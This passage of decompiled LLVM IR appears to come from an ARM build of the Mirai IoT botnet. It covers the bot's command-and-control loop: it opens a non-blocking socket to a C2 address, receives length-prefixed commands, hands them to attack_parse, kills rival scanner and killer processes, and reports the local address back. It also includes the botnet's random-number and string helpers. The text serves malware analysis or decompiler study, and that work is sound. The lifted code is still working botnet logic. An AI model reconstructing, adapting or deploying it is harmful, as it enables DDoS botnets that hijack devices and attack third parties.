  %v2_edd4 = load i8, i8* bitcast (i8** @global_var_24654.137 to i8*), align 4
  %v3_edd4 = zext i8 %v2_edd4 to i32
  store i32 %v3_edd4, i32* @r4, align 4
  %v2_edd8 = icmp eq i8 %v2_edd4, 0
  %v2_ee60 = load i32, i32* @global_var_244d0.134, align 4
  br i1 %v2_edd8, label %dec_label_pc_ee60, label %dec_label_pc_ede0

dec_label_pc_ede0:                                ; preds = %dec_label_pc_edd0
  %v3_ede4 = udiv i32 %v2_ee60, 32
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  %v3_edec = mul nuw nsw i32 %v3_ede4, 4
  %v2_edf0 = add i32 %v3_edec, %v2_eb00
  store i32 %v2_edf0, i32* %r3.global-to-local, align 4
  %v1_edf4 = add i32 %v2_edf0, -368
  %v2_edf4 = inttoptr i32 %v1_edf4 to i32*
  %v3_edf4 = load i32, i32* %v2_edf4, align 4
  %v1_edf8 = urem i32 %v2_ee60, 32
  %v6_edfc = ashr i32 %v3_edf4, %v1_edf8
  store i32 %v6_edfc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_24654.137 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_ee08 = urem i32 %v6_edfc, 2
  %v2_ee08 = icmp eq i32 %v1_ee08, 0
  store i8 0, i8* bitcast (i8** @global_var_24654.137 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_244d0.134 to i32), i32* @r5, align 4
  br i1 %v2_ee08, label %dec_label_pc_ee18, label %dec_label_pc_ef84

dec_label_pc_ee18:                                ; preds = %dec_label_pc_ede0
  store i32 60960, i32* @lr, align 4
  %v1_ee1c = icmp ne i32 %v2_ee60, -1
  call void @__pseudo_cond_branch(i1 %v1_ee1c, i32 ptrtoint (i32* @global_var_16310.35 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_ee24 = load i32, i32* @r5, align 4
  %v2_ee24 = inttoptr i32 %v1_ee24 to i32*
  store i32 -1, i32* %v2_ee24, align 4
  %v1_ee2c = call i32 @sleep(i32 1)
  br label %dec_label_pc_ec60

dec_label_pc_ee34:                                ; preds = %dec_label_pc_ece0
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  %v3_ee40 = mul nuw nsw i32 %v3_ee38, 4
  %v2_ee44 = add i32 %v3_ee40, %v2_eb00
  store i32 %v2_ee44, i32* %r3.global-to-local, align 4
  %v1_ee48 = add i32 %v2_ee44, -240
  %v2_ee48 = inttoptr i32 %v1_ee48 to i32*
  %v3_ee48 = load i32, i32* %v2_ee48, align 4
  %v1_ee4c = urem i32 %v2_ee34, 32
  %v7_ee54 = shl i32 1, %v1_ee4c
  %v8_ee54 = or i32 %v3_ee48, %v7_ee54
  store i32 %v8_ee54, i32* %r2.global-to-local, align 4
  store i32 %v8_ee54, i32* %v2_ee48, align 4
  br label %dec_label_pc_ed18

dec_label_pc_ee60:                                ; preds = %dec_label_pc_edd0
  %v7_ee64 = icmp eq i32 %v2_ee60, -1
  store i32 ptrtoint (i32* @global_var_244d0.134 to i32), i32* @r8, align 4
  br i1 %v7_ee64, label %dec_label_pc_ec60, label %dec_label_pc_ee70

dec_label_pc_ee70:                                ; preds = %dec_label_pc_ee60
  %v3_ee70 = udiv i32 %v2_ee60, 32
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  %v3_ee78 = mul nuw nsw i32 %v3_ee70, 4
  %v2_ee7c = add i32 %v3_ee78, %v2_eb00
  store i32 %v2_ee7c, i32* %r3.global-to-local, align 4
  %v1_ee80 = add i32 %v2_ee7c, -240
  %v2_ee80 = inttoptr i32 %v1_ee80 to i32*
  %v3_ee80 = load i32, i32* %v2_ee80, align 4
  %v1_ee84 = urem i32 %v2_ee60, 32
  %v6_ee88 = ashr i32 %v3_ee80, %v1_ee84
  store i32 %v6_ee88, i32* %r2.global-to-local, align 4
  %v1_ee8c = urem i32 %v6_ee88, 2
  %v2_ee8c = icmp eq i32 %v1_ee8c, 0
  br i1 %v2_ee8c, label %dec_label_pc_ec60, label %dec_label_pc_ee94

dec_label_pc_ee94:                                ; preds = %dec_label_pc_ee70
  %v6_ee98 = inttoptr i32 %v3_edd4 to i8*
  store i8* %v6_ee98, i8** %stack_var_-42, align 4
  store i32 %v2_ef70, i32* @sl, align 4
  %v0_ee9c = call i32 @__GI___errno_location()
  %v0_eea0 = load i32, i32* @r4, align 4
  %v2_eea0 = inttoptr i32 %v0_ee9c to i32*
  store i32 %v0_eea0, i32* %v2_eea0, align 4
  store i32 %v0_ee9c, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_eeb0 = load i32, i32* @global_var_244d0.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_eebc = call i32 @__libc_recv(i32 %v2_eeb0, i32 %v2_ef70, i32 2, i32 16386)
  %v7_eec0 = icmp eq i32 %v4_eebc, -1
  br i1 %v7_eec0, label %dec_label_pc_f0a0, label %dec_label_pc_eec8

dec_label_pc_eec8:                                ; preds = %dec_label_pc_ee94
  %v2_eec8 = icmp eq i32 %v4_eebc, 0
  br i1 %v2_eec8, label %dec_label_pc_f0b0, label %dec_label_pc_eed0

dec_label_pc_eed0:                                ; preds = %dec_label_pc_eec8
  store i32 %v2_ed8c, i32* %ip.global-to-local, align 4
  %v3_eed4 = load i8*, i8** %stack_var_-42, align 4
  %v4_eed4 = ptrtoint i8* %v3_eed4 to i32
  store i32 %v4_eed4, i32* %r3.global-to-local, align 4
  %v2_eed8 = icmp eq i8* %v3_eed4, null
  br i1 %v2_eed8, label %dec_label_pc_eee0, label %dec_label_pc_f0e0

dec_label_pc_eee0:                                ; preds = %dec_label_pc_eed0
  %v2_eee0 = load i32, i32* @global_var_244d0.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_eeec = add i32 %v4_eed4, 16384
  store i32 %v1_eeec, i32* %r3.global-to-local, align 4
  %v4_eef0 = call i32 @__libc_recv(i32 %v2_eee0, i32 %v2_ef70, i32 2, i32 %v1_eeec)
  br label %dec_label_pc_ec60

dec_label_pc_eef8:                                ; preds = %dec_label_pc_ecd0
  %v0_ef00 = load i32, i32* @r4, align 4
  store i32 %v0_ef00, i32* %r2.global-to-local, align 4
  %v3_ef04 = call i32 @socket(i32 2, i32 1, i32 %v0_ef00)
  %v7_ef08 = icmp eq i32 %v3_ef04, -1
  store i32 %v3_ef04, i32* @r5, align 4
  %v1_ef10 = load i32, i32* @r8, align 4
  %v2_ef10 = inttoptr i32 %v1_ef10 to i32*
  store i32 %v3_ef04, i32* %v2_ef10, align 4
  br i1 %v7_ef08, label %dec_label_pc_ece0, label %dec_label_pc_ef18

dec_label_pc_ef18:                                ; preds = %dec_label_pc_eef8
  %v0_ef18 = load i32, i32* @r4, align 4
  store i32 %v0_ef18, i32* @r2, align 4
  %v2_ef20 = call i32 @__libc_fcntl(i32 %v3_ef04, i32 3)
  %v1_ef28 = or i32 %v2_ef20, 2048
  store i32 %v1_ef28, i32* @r2, align 4
  %v0_ef2c = load i32, i32* @r5, align 4
  %v2_ef30 = call i32 @__libc_fcntl(i32 %v0_ef2c, i32 4)
  %v2_ef38 = load i32, i32* @global_var_244d4.113, align 4
  store i32 %v2_ef38, i32* %r3.global-to-local, align 4
  %v2_ef3c = icmp eq i32 %v2_ef38, 0
  br i1 %v2_ef3c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_ef18
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_ef18, %bb42
  %v2_ef44 = xor i1 %v2_ef3c, true
  call void @__pseudo_cond_branch(i1 %v2_ef44, i32 ptrtoint (i32* @global_var_1274c.139 to i32))
  store i32 ptrtoint (i8** @global_var_24654.137 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_ef50 = load i32, i32* @global_var_244d0.134, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_24654.137 to i8*), align 4
  %v4_ef60 = call i32 @__libc_connect(i32 %v2_ef50, i32 ptrtoint (i16** @global_var_2716c.115 to i32), i32 16)
  br label %dec_label_pc_ece0

dec_label_pc_ef68:                                ; preds = %dec_label_pc_ed68
  %v2_ef6c = load i32, i32* @global_var_244d0.134, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_ef7c = call i32 @__libc_send(i32 %v2_ef6c, i32 %v2_ef70, i32 2, i32 16384)
  br label %dec_label_pc_ed9c

dec_label_pc_ef84:                                ; preds = %dec_label_pc_ede0
  store i32 4, i32* @r4, align 4
  store i32 %v2_ef8c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_ef68, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_efa8 = call i32 @getsockopt(i32 %v2_ee60, i32 1, i32 4, i32 %v2_ef8c, i32 %v2_ef68)
  %v3_efac = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_efac, i32* %r3.global-to-local, align 4
  %v2_efb0 = icmp eq i32 %v3_efac, 0
  br i1 %v2_efb0, label %dec_label_pc_f03c, label %dec_label_pc_efb8

dec_label_pc_efb8:                                ; preds = %dec_label_pc_ef84
  %v2_efb8 = load i32, i32* @global_var_244d0.134, align 4
  %v1_efbc = call i32 @__GI___libc_close(i32 %v2_efb8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_efc4 = load i32, i32* @r5, align 4
  %v2_efc4 = inttoptr i32 %v1_efc4 to i32*
  store i32 -1, i32* %v2_efc4, align 4
  %v0_efc8 = call i32 @rand_next()
  %v3_efd0 = zext i32 %v0_efc8 to i64
  %v4_efd0 = mul nuw i64 %v3_efd0, 3435973837
  %v7_efd0 = trunc i64 %v4_efd0 to i32
  store i32 %v7_efd0, i32* %ip.global-to-local, align 4
  %v3_efd42 = udiv i64 %v4_efd0, 34359738368
  %v3_efd84 = mul nuw nsw i64 %v3_efd42, 8
  %v3_efd8 = trunc i64 %v3_efd84 to i32
  store i32 %v3_efd8, i32* %r2.global-to-local, align 4
  %v2_efdc6 = mul nuw nsw i64 %v3_efd42, 2
  %v2_efdc = trunc i64 %v2_efdc6 to i32
  %v2_efe0 = add i32 %v3_efd8, %v2_efdc
  store i32 %v2_efe0, i32* %r3.global-to-local, align 4
  %v2_efe4 = sub i32 %v0_efc8, %v2_efe0
  %v1_efe8 = add i32 %v2_efe4, 1
  %v1_efec = call i32 @sleep(i32 %v1_efe8)
  br label %dec_label_pc_ec60

dec_label_pc_eff4:                                ; preds = %dec_label_pc_edac
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_ef8c, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_f008 = call i32 @__libc_accept(i32 %v2_eda0, i32 %v2_f000, i32 %v2_ef8c, i32 16, i32 16)
  %v1_f00c = call i32 @scanner_kill(i32 %v5_f008)
  %v1_f010 = call i32 @killer_kill(i32 %v1_f00c)
  %v2_f020 = call i32 @kill(i32 %v1_f01c, i32 9)
  store i32 ptrtoint (i32* @global_var_24650.125 to i32), i32* %r3.global-to-local, align 4
  %v2_f028 = load i32, i32* @global_var_24650.125, align 4
  %v2_f02c = icmp eq i32 %v2_f028, 0
  br i1 %v2_f02c, label %dec_label_pc_f034, label %dec_label_pc_f0d4

dec_label_pc_f034:                                ; preds = %dec_label_pc_eff4, %dec_label_pc_f0d4
  %v1_f038 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f03c

dec_label_pc_f03c:                                ; preds = %dec_label_pc_ef84, %dec_label_pc_f034
  %v2_f040 = call i32 @util_strlen(i8* %v1_f040)
  %sext = mul i32 %v2_f040, 16777216
  %v1_f044 = sdiv i32 %sext, 16777216
  %v7_f044 = inttoptr i32 %v1_f044 to i8*
  store i8* %v7_f044, i8** %stack_var_-42, align 4
  %v0_f048 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_27164.91 to i32), i32* @lr, align 4
  %v0_f050 = load i32, i32* @r4, align 4
  store i32 %v0_f050, i32* %r2.global-to-local, align 4
  store i32 %v0_f048, i32* @global_var_27164.91, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f060 = load i32, i32* @r5, align 4
  %v1_f060 = inttoptr i32 %v0_f060 to i32*
  %v2_f060 = load i32, i32* %v1_f060, align 4
  %v4_f064 = call i32 @__libc_send(i32 %v2_f060, i32 ptrtoint (i32* @global_var_1b3ac.143 to i32), i32 %v0_f050, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_f070 = load i32, i32* @r5, align 4
  %v1_f070 = inttoptr i32 %v0_f070 to i32*
  %v2_f070 = load i32, i32* %v1_f070, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f07c = call i32 @__libc_send(i32 %v2_f070, i32 %v2_ef70, i32 1, i32 16384)
  %v3_f080 = load i8*, i8** %stack_var_-42, align 4
  %v4_f080 = ptrtoint i8* %v3_f080 to i32
  store i32 %v4_f080, i32* %r2.global-to-local, align 4
  %v3_f084 = icmp eq i8* %v3_f080, null
  br i1 %v3_f084, label %dec_label_pc_ec60, label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f03c
  %v0_f08c = load i32, i32* @r5, align 4
  %v1_f08c = inttoptr i32 %v0_f08c to i32*
  %v2_f08c = load i32, i32* %v1_f08c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f098 = call i32 @__libc_send(i32 %v2_f08c, i32 %v2_ea9c, i32 %v4_f080, i32 16384)
  br label %dec_label_pc_ec60

dec_label_pc_f0a0:                                ; preds = %dec_label_pc_f110, %dec_label_pc_ee94
  %v0_f0a0 = load i32, i32* @r5, align 4
  %v1_f0a0 = inttoptr i32 %v0_f0a0 to i32*
  %v2_f0a0 = load i32, i32* %v1_f0a0, align 4
  store i32 %v2_f0a0, i32* %r3.global-to-local, align 4
  %v7_f0a4 = icmp eq i32 %v2_f0a0, 4
  br i1 %v7_f0a4, label %dec_label_pc_ec60, label %bb44

bb44:                                             ; preds = %dec_label_pc_f0a0
  %v8_f0a8 = icmp eq i32 %v2_f0a0, 11
  br i1 %v8_f0a8, label %dec_label_pc_ec60, label %dec_label_pc_f0b0

dec_label_pc_f0b0:                                ; preds = %dec_label_pc_f134, %bb44, %dec_label_pc_eec8
  %v2_f0b0 = load i32, i32* @global_var_244d0.134, align 4
  store i32 61628, i32* @lr, align 4
  %v1_f0b8 = icmp ne i32 %v2_f0b0, -1
  call void @__pseudo_cond_branch(i1 %v1_f0b8, i32 ptrtoint (i32* @global_var_16310.35 to i32))
  store i32 ptrtoint (i32* @global_var_244d0.134 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_244d0.134, align 4
  %v1_f0cc = call i32 @sleep(i32 1)
  br label %dec_label_pc_ec60

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_eff4
  %v2_f0d8 = call i32 @kill(i32 %v2_f028, i32 9)
  br label %dec_label_pc_f034

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_eed0
  %v3_f0e0 = udiv i32 %v4_eed4, 256
  %v1_f0e4 = urem i32 %v4_eed4, 256
  store i32 %v1_f0e4, i32* %r3.global-to-local, align 4
  %v4_f0e8 = mul nuw nsw i32 %v1_f0e4, 256
  %v5_f0e8 = or i32 %v4_f0e8, %v3_f0e0
  %v6_f0e8 = trunc i32 %v5_f0e8 to i16
  store i32 %v5_f0e8, i32* %r2.global-to-local, align 4
  store i32 %v2_ed8c, i32* @lr, align 4
  %v7_f0f4 = inttoptr i32 %v5_f0e8 to i8*
  store i8* %v7_f0f4, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_f0e8, 1025
  br i1 %tmp45, label %dec_label_pc_f110, label %dec_label_pc_f0fc

dec_label_pc_f0fc:                                ; preds = %dec_label_pc_f0e0
  %v2_f0fc = load i32, i32* @global_var_244d0.134, align 4
  %v1_f100 = call i32 @__GI___libc_close(i32 %v2_f0fc)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f108 = load i32, i32* @r8, align 4
  %v2_f108 = inttoptr i32 %v1_f108 to i32*
  store i32 -1, i32* %v2_f108, align 4
  br label %dec_label_pc_ec60

dec_label_pc_f110:                                ; preds = %dec_label_pc_f0e0
  %v0_f110 = load i32, i32* @r4, align 4
  %v1_f110 = load i32, i32* @r5, align 4
  %v2_f110 = inttoptr i32 %v1_f110 to i32*
  store i32 %v0_f110, i32* %v2_f110, align 4
  store i32 %v2_f118, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f120 = load i32, i32* @global_var_244d0.134, align 4
  %v7_f128 = call i32 @__libc_recv(i32 %v2_f120, i32 %v2_f118, i32 %v5_f0e8, i32 16386)
  %v7_f12c = icmp eq i32 %v7_f128, -1
  br i1 %v7_f12c, label %dec_label_pc_f0a0, label %dec_label_pc_f134

dec_label_pc_f134:                                ; preds = %dec_label_pc_f110
  %v2_f134 = icmp eq i32 %v7_f128, 0
  br i1 %v2_f134, label %dec_label_pc_f0b0, label %dec_label_pc_f13c

dec_label_pc_f13c:                                ; preds = %dec_label_pc_f134
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f148 = load i32, i32* @global_var_244d0.134, align 4
  %v4_f14c = call i32 @__libc_recv(i32 %v2_f148, i32 %v2_ef70, i32 2, i32 16384)
  %v3_f154 = load i8*, i8** %stack_var_-42, align 4
  %v4_f154 = ptrtoint i8* %v3_f154 to i32
  %v3_f158 = udiv i32 %v4_f154, 256
  %v1_f15c = mul i32 %v4_f154, 256
  %v4_f160 = and i32 %v1_f15c, 65280
  %v5_f160 = or i32 %v4_f160, %v3_f158
  store i32 %v5_f160, i32* %ip.global-to-local, align 4
  store i32 %v2_ed8c, i32* @lr, align 4
  store i32 %v5_f160, i32* %r2.global-to-local, align 4
  %v2_f170 = load i32, i32* @global_var_244d0.134, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f178 = inttoptr i32 %v5_f160 to i8*
  store i8* %v6_f178, i8** %stack_var_-42, align 4
  %v6_f17c = call i32 @__libc_recv(i32 %v2_f170, i32 %v2_f118, i32 %v5_f160, i32 16384)
  store i32 %v2_ed8c, i32* %r2.global-to-local, align 4
  %v3_f184 = load i8*, i8** %stack_var_-42, align 4
  %v3_f188 = icmp eq i8* %v3_f184, null
  br i1 %v3_f188, label %dec_label_pc_ec60, label %dec_label_pc_f190

dec_label_pc_f190:                                ; preds = %dec_label_pc_f13c
  %v4_f184 = ptrtoint i8* %v3_f184 to i32
  %v5_f194 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_f184, i32 %v2_ed8c)
  br label %dec_label_pc_ec60

; uselistorder directives
  uselistorder i8* %v3_f184, { 1, 0 }
  uselistorder i32 %v5_f160, { 1, 0, 2, 3 }
  uselistorder i32 %v7_f128, { 1, 0 }
  uselistorder i32 %v5_f0e8, { 1, 0, 3, 2 }
  uselistorder i32 %v3_ef04, { 3, 2, 1, 0 }
  uselistorder i32 %v4_eed4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_eebc, { 1, 0 }
  uselistorder i32 %v2_ee60, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_eda0, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ed88, { 1, 0, 2 }
  uselistorder i32 %v5_ed54, { 1, 2, 0 }
  uselistorder i32 %v2_eca0, { 2, 1, 0 }
  uselistorder i32 %v1_ec90, { 1, 2, 0 }
  uselistorder i32 %v1_ec74, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_ef8c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ef70, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_ef68, { 1, 0 }
  uselistorder i32 %v2_ed8c, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_ec5c, { 1, 0, 2 }
  uselistorder i32 %v2_eb00, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_eaec, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_ea5c, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_24650.125, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 (i32)* @sleep, { 9, 8, 3, 1, 2, 7, 6, 5, 4, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_24654.137 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_24654.137 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_244cc.120, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_244d0.134, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i8*, i32)* @util_strcpy, { 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 22, 3, 23, 4, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32, i32)* @rand_alphastr, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32* @global_var_244d4.113, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_e764.111 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_f03c, { 1, 0 }
  uselistorder label %dec_label_pc_f034, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_ed9c, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_ece0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ecd0, { 1, 0 }
  uselistorder label %dec_label_pc_ec60, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_eac0, { 2, 0, 1 }
}

define i32 @function_f1c0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f1c0:
  %v0_f1c0 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_f1c0, i32 -22307724)
  %v0_f1c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f1c8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1c0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1c0, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_f1dc = load i32, i32* @global_var_24658.145, align 4
  %v2_f1e0 = load i32, i32* @global_var_24664.147, align 4
  %v4_f1ec = mul i32 %v2_f1dc, 2048
  %v5_f1ec = xor i32 %v4_f1ec, %v2_f1dc
  %v4_f1f0 = udiv i32 %v2_f1e0, 524288
  %v5_f1f0 = xor i32 %v4_f1f0, %v2_f1e0
  %v2_f1f4 = load i32, i32* @global_var_2465c.149, align 4
  %v2_f1f8 = load i32, i32* @global_var_24660.151, align 4
  %v2_f1fc = xor i32 %v5_f1f0, %v5_f1ec
  %v4_f200 = udiv i32 %v5_f1ec, 256
  %v5_f200 = xor i32 %v2_f1fc, %v4_f200
  store i32 %v2_f1f4, i32* @global_var_24658.145, align 4
  store i32 %v2_f1f8, i32* @global_var_2465c.149, align 4
  store i32 %v2_f1e0, i32* @global_var_24660.151, align 4
  store i32 %v5_f200, i32* @global_var_24664.147, align 4
  ret i32 %v5_f200

; uselistorder directives
  uselistorder i32 %v2_f1e0, { 2, 1, 0 }
  uselistorder i32 %v2_f1dc, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f238 = call i32 @__GI_time(i32* null)
  store i32 %v2_f238, i32* @global_var_24658.145, align 4
  %v1_f244 = call i32 @__getpid(i32 %v2_f238)
  store i32 %v1_f244, i32* @r0, align 4
  %v0_f24c = call i32 @getppid()
  %v2_f254 = xor i32 %v1_f244, %v0_f24c
  store i32 %v2_f254, i32* @global_var_2465c.149, align 4
  %v1_f25c = call i32 @clock(i32 %v2_f254)
  %v2_f260 = load i32, i32* @global_var_2465c.149, align 4
  %v2_f26c = xor i32 %v2_f260, %v1_f25c
  store i32 %v2_f26c, i32* @global_var_24664.147, align 4
  store i32 %v1_f25c, i32* @global_var_24660.151, align 4
  ret i32 %v1_f25c

; uselistorder directives
  uselistorder i32 %v1_f25c, { 1, 2, 0 }
}

define i32 @rand_alphastr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_f294 = load i32, i32* @r4, align 4
  %v6_f294 = load i32, i32* @r5, align 4
  %v9_f294 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_f2a8 = call i32 @table_unlock_val(i32 57)
  %v3_f2b4 = call i32 @table_retrieve_val(i32 57, i32* null)
  store i32 %v3_f2b4, i32* @r1, align 4
  %v2_f2c0 = bitcast i32* %stack_var_-72 to i8*
  %v3_f2c0 = call i32 @strcpy(i8* %v2_f2c0, i32 %v3_f2b4)
  %v2_f2c4 = icmp eq i32 %arg2, 0
  br i1 %v2_f2c4, label %dec_label_pc_f340, label %dec_label_pc_f2cc

dec_label_pc_f2cc:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_24658.145 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2465c.149 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24660.151 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24664.147 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_f324 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f2e0

dec_label_pc_f2e0:                                ; preds = %dec_label_pc_f2e0.dec_label_pc_f2e0_crit_edge, %dec_label_pc_f2cc
  %v1_f304 = phi i32 [ %v1_f304.pre, %dec_label_pc_f2e0.dec_label_pc_f2e0_crit_edge ], [ ptrtoint (i32* @global_var_24658.145 to i32), %dec_label_pc_f2cc ]
  %v2_f2e0 = load i32, i32* @global_var_24664.147, align 4
  store i32 %v2_f2e0, i32* %r2.global-to-local, align 4
  %v2_f2e4 = load i32, i32* @global_var_24658.145, align 4
  %v4_f2e8 = udiv i32 %v2_f2e0, 524288
  %v5_f2e8 = xor i32 %v4_f2e8, %v2_f2e0
  %v4_f2ec = mul i32 %v2_f2e4, 2048
  %v5_f2ec = xor i32 %v4_f2ec, %v2_f2e4
  %v2_f2f0 = xor i32 %v5_f2e8, %v5_f2ec
  %v2_f2f4 = load i32, i32* @global_var_2465c.149, align 4
  %v2_f2f8 = load i32, i32* @global_var_24660.151, align 4
  store i32 %v2_f2f8, i32* %ip.global-to-local, align 4
  %v4_f2fc = udiv i32 %v5_f2ec, 256
  %v5_f2fc = xor i32 %v2_f2f0, %v4_f2fc
  store i32 %v5_f2fc, i32* @r4, align 4
  %v2_f304 = inttoptr i32 %v1_f304 to i32*
  store i32 %v2_f2f4, i32* %v2_f304, align 4
  %v0_f308 = load i32, i32* %ip.global-to-local, align 4
  %v1_f308 = load i32, i32* %r8.global-to-local, align 4
  %v2_f308 = inttoptr i32 %v1_f308 to i32*
  store i32 %v0_f308, i32* %v2_f308, align 4
  %v0_f30c = load i32, i32* %r2.global-to-local, align 4
  %v1_f30c = load i32, i32* %r7.global-to-local, align 4
  %v2_f30c = inttoptr i32 %v1_f30c to i32*
  store i32 %v0_f30c, i32* %v2_f30c, align 4
  %v0_f310 = load i32, i32* @r4, align 4
  %v1_f310 = load i32, i32* @r6, align 4
